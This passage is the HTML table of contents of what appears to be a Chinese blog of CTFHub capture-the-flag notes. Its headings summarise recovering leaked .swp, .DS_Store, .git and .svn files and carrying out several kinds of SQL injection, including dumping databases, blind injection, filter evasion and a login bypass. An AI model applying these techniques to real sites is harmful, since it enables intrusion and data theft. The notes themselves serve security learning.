href="#%E6%90%9C%E7%B4%A2vim%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E4%B8%BA-swp%EF%BC%8C%E7%84%B6%E5%90%8E%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEindex-php-swp%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%B8%8D%E8%A1%8C%EF%BC%8C%E7%84%B6%E5%90%8E%E7%BB%A7%E7%BB%AD%E6%90%9C%E7%B4%A2%EF%BC%8C%E5%BE%97%E5%88%B0-swp%E6%96%87%E4%BB%B6%E4%B8%BA%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E4%BB%A5-index-php-swp%E8%AE%BF%E9%97%AE%EF%BC%8C%E7%84%B6%E5%90%8E%E5%BE%97%E5%88%B0%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%8Cwinhex%E6%89%93%E5%BC%80%E5%BE%97%E5%88%B0flag%E3%80%82"><span class="toc-number">1.2.6.</span> <span class="toc-text">搜索vim缓存文件后缀名为.swp，然后直接访问index.php.swp，发现不行，然后继续搜索，得到.swp文件为隐藏文件，需要以.index.php.swp访问，然后得到备份文件，winhex打开得到flag。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-DS-Store"><span class="toc-number">1.2.7.</span> <span class="toc-text">4).DS_Store</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-DS-Store%E5%8D%B3%E4%B8%BA%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E6%B8%85%E5%8D%95%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B8%8B%E8%BD%BD%E5%90%8E%E7%94%A8winhex%E6%89%93%E5%BC%80%EF%BC%8C%E6%89%BE%E5%88%B0flag%E5%AF%B9%E5%BA%94%E4%BD%8D%E7%BD%AE%EF%BC%8C%E7%9C%8B%E5%88%B0%E4%B8%8A%E9%9D%A2%E4%B8%80%E4%B8%B2%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%83%B3%E5%88%B0%E5%8F%AF%E8%83%BD%E8%A6%81%E8%AE%BF%E9%97%AE%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%80%E5%BC%80%E5%A7%8B%E6%B2%A1%E7%9C%8B%E5%87%BA%E6%9D%A5%E4%B8%AD%E9%97%B4%E7%9A%84-txt%E5%90%8E%E7%BC%80%EF%BC%8C%E5%AF%BC%E8%87%B4%E8%AF%95%E4%BA%86%E5%A5%BD%E5%A4%9A%E6%AC%A1%EF%BC%8C%E7%9C%8B%E5%87%BA%E6%9D%A5%E4%B9%8B%E5%90%8E%E5%B0%B1%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE%E5%BE%97%E5%88%B0flag%E3%80%82"><span class="toc-number">1.2.8.</span> <span class="toc-text">题目提示.DS_Store即为隐藏文件清单，访问下载后用winhex打开，找到flag对应位置，看到上面一串字符，想到可能要访问，但是一开始没看出来中间的.txt后缀，导致试了好多次，看出来之后就成功访问得到flag。</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%EF%BC%88%E4%BB%A5%E4%B8%BA-tx%E6%98%AF%E5%90%8E%E7%BC%80%E4%B9%9F%E6%98%AF%E6%97%A0%E6%95%8C%E4%BA%86%EF%BC%89"><span class="toc-number">1.2.8.0.0.1.</span> <span class="toc-text">（以为.tx是后缀也是无敌了）</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-CTFHubGit%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.</span> <span class="toc-text">3.CTFHubGit泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-log"><span class="toc-number">1.3.1.</span> <span class="toc-text">1)log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E%E8%A6%81%E7%94%A8githack%EF%BC%8C%E5%85%88%E4%B8%8Bgit%E7%8E%AF%E5%A2%83%E5%86%8D%E4%B8%8Bgithack%EF%BC%8C%E7%94%B5%E8%84%91%E4%B8%8A%E4%B8%8B%E8%BD%BD%E5%87%BA%E6%9D%A5%E7%9A%84%E8%BF%90%E8%A1%8C%E4%B8%8D%E4%BA%86%EF%BC%8C%E5%8E%BBkali%E9%87%8C%E9%9D%A2%E4%B8%8B%EF%BC%8C%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%E4%B9%8B%E5%90%8E%E5%AF%B9%E7%BD%91%E7%AB%99-git%E7%9B%AE%E5%BD%95%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%81%A2%E5%A4%8D%EF%BC%8C%E6%81%A2%E5%A4%8D%E6%88%90%E5%8A%9F%E5%90%8E%E5%8E%BB%E5%AD%A6git%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E5%8E%86%E5%8F%B2%E4%BF%AE%E6%94%B9%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AFgit-log%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E6%B7%BB%E5%8A%A0%E5%92%8C%E7%A7%BB%E9%99%A4flag%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E5%AD%A6%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E4%BF%AE%E6%94%B9%E7%9A%84%E5%85%B7%E4%BD%93%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E7%94%A8git-diff%E6%98%BE%E7%A4%BA%E4%B8%A4%E6%AC%A1%E6%8F%90%E4%BA%A4%E4%B9%8B%E9%97%B4%E7%9A%84%E5%B7%AE%E5%BC%82%EF%BC%8C%E7%84%B6%E5%90%8E%E5%BE%97%E5%88%B0flag%E3%80%82"><span class="toc-number">1.3.2.</span> <span class="toc-text">题目说明要用githack，先下git环境再下githack，电脑上下载出来的运行不了，去kali里面下，安装成功之后对网站.git目录进行源代码恢复，恢复成功后去学git怎么查看历史修改信息，发现是git log，然后发现添加和移除flag的操作，然后再学怎么查看修改的具体信息，发现可以用git diff显示两次提交之间的差异，然后得到flag。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-stash"><span class="toc-number">1.3.3.</span> <span class="toc-text">2)stash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E9%9D%A2%E6%98%AF%E8%B7%9F%E7%AC%AC%E4%B8%80%E4%B8%AAlog%E9%A2%98%E5%87%A0%E4%B9%8E%E4%B8%80%E6%A0%B7%E7%9A%84%E6%AD%A5%E9%AA%A4%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%A6%81%E7%94%A8git-stash-list%E6%9D%A5%E6%9F%A5%E7%9C%8B%E7%94%A8stash%E4%BF%9D%E5%AD%98%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E8%A6%81git-stash-apply%E8%8E%B7%E5%8F%96%E4%BF%9D%E5%AD%98%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%B0%B1%E5%BE%97%E5%88%B0flag%E4%BA%86%E3%80%82"><span class="toc-number">1.3.4.</span> <span class="toc-text">前面是跟第一个log题几乎一样的步骤，不过要用git stash list来查看用stash保存的信息，然后再要git stash apply获取保存信息，就得到flag了。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-index"><span class="toc-number">1.3.5.</span> <span class="toc-text">3)index</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E9%A2%98%E7%9B%B4%E6%8E%A5githack%E6%BA%90%E4%BB%A3%E7%A0%81%E4%BF%AE%E5%A4%8D%E5%B0%B1%E5%87%BA%E6%9D%A5%E4%BA%86%E3%80%82"><span class="toc-number">1.3.6.</span> <span class="toc-text">这个题直接githack源代码修复就出来了。</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%AF%94%E5%89%8D%E9%9D%A2%E8%BF%98%E7%AE%80%E5%8D%95%EF%BC%8C%E6%98%AF%E6%88%91%E9%98%B4%E5%B7%AE%E9%98%B3%E9%94%99%E5%81%9A%E5%87%BA%E6%9D%A5%E7%9A%84%EF%BC%9F"><span class="toc-number">1.3.6.0.0.1.</span> <span class="toc-text">怎么比前面还简单，是我阴差阳错做出来的？</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-CTFHubSVN%E6%B3%84%E9%9C%B2"><span class="toc-number">1.4.</span> <span class="toc-text">4.CTFHubSVN泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88%E7%94%A8disearch%E6%89%AB%E6%8F%8F%E7%A1%AE%E5%AE%9A%E6%98%AF%E5%90%A6%E6%9C%89SVN%E6%B3%84%E9%9C%B2%EF%BC%8C%E6%89%BE%E5%88%B0%E4%B9%8B%E5%90%8Edvcs-ripper%E6%8A%8ASVN%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%EF%BC%8C%E7%84%B6%E5%90%8E%E6%89%93%E5%BC%80-svn%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E5%BE%88%E5%A4%9A%E6%96%87%E4%BB%B6%E5%A4%B9%EF%BC%8C%E6%89%80%E4%BB%A5%E7%94%A8tree%E5%91%BD%E4%BB%A4%E6%9D%A5%E6%9F%A5%E6%89%BE%E9%82%A3%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9C%89%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8E%BBpristine%E6%96%87%E4%BB%B6%E5%A4%B9cat%E6%96%87%E4%BB%B6%EF%BC%8C%E4%B8%80%E4%B8%AA%E4%B8%AA%E8%AE%BF%E9%97%AE%E5%90%8E%E5%9C%A875%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E9%87%8C%E9%9D%A2%E6%9C%89flag%E3%80%82"><span class="toc-number">1.4.1.</span> <span class="toc-text">先用disearch扫描确定是否有SVN泄露，找到之后dvcs-ripper把SVN文件下载下来，然后打开.svn文件夹，发现有很多文件夹，所以用tree命令来查找那个文件夹有文件，然后去pristine文件夹cat文件，一个个访问后在75文件夹下的文件里面有flag。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%92%8C%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.1.</span> <span class="toc-text">1)整数型注入和字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E4%B8%A4%E4%B8%AA%E7%9A%84%E5%8C%BA%E5%88%AB%E5%8F%AF%E4%BB%A5%E7%94%A8-id-1asd%E6%9D%A5%E5%88%A4%E6%96%AD%EF%BC%8C%E6%AD%A3%E5%B8%B8%E5%9B%9E%E6%98%BE%E4%B8%BA%E5%AD%97%E7%AC%A6%EF%BC%8C%E9%94%99%E8%AF%AF%E5%9B%9E%E6%98%BE%E4%B8%BA%E6%95%B4%E6%95%B0%E3%80%82%E6%95%B4%E6%95%B0%E5%9E%8B%E4%B8%8D%E9%9C%80%E8%A6%81-%E2%80%98-%E9%97%AD%E5%90%88%EF%BC%8C%E5%AD%97%E7%AC%A6%E5%9E%8B%E9%9C%80%E8%A6%81-%E2%80%99-%E9%97%AD%E5%90%88%E3%80%82"><span class="toc-number">1.5.2.</span> <span class="toc-text">这两个的区别可以用?id&#x3D;1asd来判断，正常回显为字符，错误回显为整数。整数型不需要 ‘ 闭合，字符型需要 ’ 闭合。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BD%99%E7%9A%84%E8%BF%87%E7%A8%8B%E5%9F%BA%E6%9C%AC%E7%9B%B8%E4%BC%BC"><span class="toc-number">1.5.3.</span> <span class="toc-text">其余的过程基本相似</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC0%E6%AD%A5%EF%BC%9A%E7%A1%AE%E5%AE%9A%E6%9C%89%E6%B2%A1%E6%9C%89sql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%B8%8B%E9%9D%A2get%E5%88%A4%E6%96%AD%E3%80%82"><span class="toc-number">1.5.4.</span> <span class="toc-text">第0步：确定有没有sql注入的漏洞，可以通过下面get判断。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%A1%AE%E5%AE%9A%E6%9C%89%E5%87%A0%E4%B8%AA%E5%AD%97%E6%AE%B5-%E4%BB%8E%E5%A4%A7%E5%88%B0%E5%B0%8F%E7%94%A8%E4%BA%8C%E5%88%86%E6%B3%95%E6%95%88%E7%8E%87%E6%9B%B4%E9%AB%98"><span class="toc-number">1.5.5.</span> <span class="toc-text">第一步：确定有几个字段(从大到小用二分法效率更高)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-number">1.5.6.</span> <span class="toc-text">第二步：判断回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%8C%E5%B0%86%E5%9B%9E%E6%98%BE%E4%BD%8D%E6%94%B9%E4%B8%BAdatabase"><span class="toc-number">1.5.7.</span> <span class="toc-text">第三步：查看数据库名，将回显位改为database()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E6%9F%A5%E6%89%BE%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">1.5.8.</span> <span class="toc-text">第四步：查找数据库中的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%9F%A5%E6%89%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%88%97%E5%90%8D"><span class="toc-number">1.5.9.</span> <span class="toc-text">第五步：查找表中的列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E6%9F%A5%E6%89%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%88%E8%84%B1%E5%BA%93%EF%BC%89"><span class="toc-number">1.5.10.</span> <span class="toc-text">第六步：查找表中的数据（脱库）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">2)报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E6%98%AF%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%88%A9%E7%94%A8updatexml%E5%92%8Cextractvalue%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E5%90%8C%E6%97%B6%E6%8A%8A0x7e%EF%BC%88-%EF%BC%89%E5%92%8C%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E5%8A%A0%E5%85%A5%E6%9F%A5%E8%AF%A2%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8F%82%E6%95%B0%E4%B8%AD%E3%80%82"><span class="toc-number">1.6.1.</span> <span class="toc-text">原理是利用报错回显进行查询注入，利用updatexml和extractvalue进行查询，同时把0x7e（~）和注入语句加入查询命令的参数中。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E5%90%8C%E7%AC%AC%E4%B8%80%E7%B1%BB%E3%80%82"><span class="toc-number">1.6.2.</span> <span class="toc-text">注入命令同第一类。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E7%94%B1%E4%BA%8E%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE%E6%9C%89%E5%AD%97%E6%95%B0%E9%99%90%E5%88%B6%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E4%BB%A5%E7%94%A8substr%E8%BF%9B%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E6%96%AD%E6%9D%A5%E8%BF%9B%E8%A1%8C%E5%88%86%E6%AE%B5%E8%BE%93%E5%87%BA%E3%80%82"><span class="toc-number">1.6.3.</span> <span class="toc-text">但是由于报错回显有字数限制，所以可以用substr进行字符串截断来进行分段输出。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.7.</span> <span class="toc-text">3)布尔盲注和延时盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E6%B3%A8%E5%85%A5%E6%97%B6%E5%9B%9E%E6%98%BE%E5%8F%AA%E6%9C%89%E6%AD%A3%E7%A1%AE%E5%92%8C%E9%94%99%E8%AF%AF%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%8C%E6%88%96%E8%80%85%E6%A0%B9%E6%9C%AC%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%88%A9%E7%94%A8if-%E5%88%A4%E6%96%AD%E5%91%BD%E4%BB%A4%EF%BC%8Csleep%EF%BC%88x%EF%BC%89%EF%BC%8C1%EF%BC%89%E5%87%BD%E6%95%B0%E5%B0%86%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%8C%E5%86%8D%E5%88%A9%E7%94%A8length%E5%92%8Ccount%E6%96%B9%E4%BE%BF%E5%88%A4%E6%96%AD%E9%95%BF%E5%BA%A6%E5%92%8C%E6%95%B0%E9%87%8F%EF%BC%8C%E7%94%A8ascii%EF%BC%88substr%EF%BC%88%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%EF%BC%8Cn-1%EF%BC%89%EF%BC%89%E4%B8%80%E4%B8%AA%E4%B8%80%E4%B8%AA%E7%9A%84%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E6%9D%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E3%80%82"><span class="toc-number">1.7.1.</span> <span class="toc-text">在注入时回显只有正确和错误的布尔盲注，或者根本没有回显的延时盲注情况下，利用if(判断命令，sleep（x），1）函数将延时盲注转换为布尔盲注，再利用length和count方便判断长度和数量，用ascii（substr（注入命令，n,1））一个一个的判断字符来获取数据。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B1%E6%AD%A4%E5%8F%AF%E8%A7%81%E5%B7%A5%E7%A8%8B%E9%87%8F%E9%9D%9E%E5%B8%B8%E9%9D%9E%E5%B8%B8%E5%A4%A7%EF%BC%8C%E5%8D%B3%E4%BD%BF%E5%88%A9%E7%94%A8BP%E8%BF%9B%E8%A1%8C%E5%AD%97%E7%AC%A6%E5%88%A4%E6%96%AD%EF%BC%8C%E4%B9%9F%E9%9D%9E%E5%B8%B8%E5%A4%8D%E6%9D%82%EF%BC%8C%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5%E7%94%A8sqlmap%E5%81%9A%E4%BA%86%E3%80%82"><span class="toc-number">1.7.2.</span> <span class="toc-text">由此可见工程量非常非常大，即使利用BP进行字符判断，也非常复杂，所以直接用sqlmap做了。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-cookie%E6%B3%A8%E5%85%A5%EF%BC%8CUA%E6%B3%A8%E5%85%A5%EF%BC%8Crefer%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text">4)cookie注入，UA注入，refer注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%83%BD%E6%98%AF%E6%94%B9%E4%BA%86%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E7%94%A8hackbar%E6%88%96%E8%80%85BP%E9%83%BD%E5%8F%AF%E4%BB%A5%E5%BE%88%E7%AE%80%E5%8D%95%E7%9A%84%E5%81%9A%E5%87%BA%E6%9D%A5%EF%BC%8C%E6%96%B9%E6%B3%95%E5%92%8C%E7%AC%AC%E4%B8%80%E7%A7%8D%E7%B1%BB%E4%BC%BC%EF%BC%8C%E5%B0%B1%E4%B8%8D%E8%B5%98%E8%BF%B0%E4%BA%86"><span class="toc-number">1.8.1.</span> <span class="toc-text">都是改了注入点，用hackbar或者BP都可以很简单的做出来，方法和第一种类似，就不赘述了</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-sql%E7%BB%93%E6%9E%84"><span class="toc-number">1.9.</span> <span class="toc-text">5)sql结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E7%AC%AC%E4%B8%80%E7%B1%BB%E3%80%82"><span class="toc-number">1.9.1.</span> <span class="toc-text">同第一类。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">1.10.</span> <span class="toc-text">6)空格过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-%E4%BB%A3%E6%9B%BF%E5%8D%B3%E5%8F%AF%EF%BC%8C-str-%E4%B8%BAsql%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A%EF%BC%8C%E6%B3%A8%E5%85%A5%E5%90%8E%E5%B0%B1%E5%8F%98%E6%88%90%E7%A9%BA%E6%A0%BC%E4%BA%86"><span class="toc-number">1.10.1.</span> <span class="toc-text">用&#x2F;**&#x2F;代替即可，&#x2F;*str*&#x2F;为sql中的注释，注入后就变成空格了</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-mysql%E5%9C%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E6%97%B6%EF%BC%8C%E4%BC%9A%E8%87%AA%E5%8A%A8%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%95%B0%E6%8D%AE-GXYCTF2019-BabySQli"><span class="toc-number">1.11.</span> <span class="toc-text">7)mysql在联合查询不存在的数据时，会自动构建虚拟数据 ([GXYCTF2019]BabySQli)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8mysql%E5%9C%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E6%97%B6%EF%BC%8C%E4%BC%9A%E8%87%AA%E5%8A%A8%E6%9E%84%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%95%B0%E6%8D%AE%E7%9A%84%E7%89%B9%E6%80%A7"><span class="toc-number">1.11.1.</span> <span class="toc-text">利用mysql在联合查询不存在的数据时，会自动构建虚拟数据的特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E5%A6%82%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8%EF%BC%9A"><span class="toc-number">1.11.2.</span> <span class="toc-text">比如我们使用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E6%9C%AC%E5%BA%93%E9%87%8C%E6%B2%A1%E6%9C%89123456%EF%BC%8C%E4%BD%86mysql%E8%87%AA%E5%8A%A8%E7%BB%99%E6%88%91%E4%BB%AC%E5%8A%A0%E4%B8%8A%E4%BA%86%EF%BC%8C%E7%9B%B8%E5%BD%93%E4%BA%8E%E6%88%91%E4%BB%AC%E4%B8%B4%E6%97%B6%E5%88%9B%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AAadmin%E7%94%A8%E6%88%B7%EF%BC%8C%E5%AF%86%E7%A0%81%E6%98%AF123456%E3%80%82"><span class="toc-number">1.11.3.</span> <span class="toc-text">原本库里没有123456，但mysql自动给我们加上了，相当于我们临时创建了一个admin用户，密码是123456。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E4%B8%80%E8%88%AC%E5%AF%86%E7%A0%81%E4%BD%8D%E9%83%BD%E6%9C%89md5%E5%8A%A0%E5%AF%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%86%E5%AF%86%E7%A0%81%E4%BD%8Dmd5%E5%8A%A0%E5%AF%86%E5%90%8E%E5%86%8D%E6%B3%A8%E5%85%A5%E3%80%82"><span class="toc-number">1.11.4.</span> <span class="toc-text">但是一般密码位都有md5加密，所以将密码位md5加密后再注入。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%81%87%E8%AE%BE%E5%AF%86%E7%A0%81%E6%98%AF123456%EF%BC%8C%E5%85%B6md5%E5%80%BC%E4%B8%BA%EF%BC%9Ae10adc3949ba59abbe56e057f20f883e"><span class="toc-number">1.11.5.</span> <span class="toc-text">所以我们假设密码是123456，其md5值为：e10adc3949ba59abbe56e057f20f883e</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%A0%B7%E5%9C%A8%E9%AA%8C%E8%AF%81%E5%90%8E%E9%9D%A2%E7%9A%84pw%EF%BC%88password%EF%BC%89-123456%E6%97%B6%E4%BE%BF%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%88%91%E4%BB%AC%E5%BB%BA%E7%AB%8B%E7%9A%84%E4%B8%B4%E6%97%B6%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.11.6.</span> <span class="toc-text">这样在验证后面的pw（password）&#x3D;123456时便可以通过我们建立的临时密码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E8%99%9A%E6%8B%9F%E8%BA%AB%E4%BB%BD%E6%9D%A5%E8%BF%9B%E8%A1%8C%E4%BC%AA%E9%80%A0%E7%9C%9F%E5%AE%9E%E8%BA%AB%E4%BB%BD%EF%BC%8C%E4%BB%8E%E8%80%8C%E7%BB%95%E8%BF%87%E5%AE%A1%E6%A0%B8%E6%9C%BA%E5%88%B6%E3%80%82"><span class="toc-number">1.11.7.</span> <span class="toc-text">利用构造一个虚拟身份来进行伪造真实身份，从而绕过审核机制。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E9%9D%9E%E5%B8%B8%E5%A5%BD%E7%94%A8"><span class="toc-number">1.11.8.</span> <span class="toc-text">sqlmap非常好用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.12.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 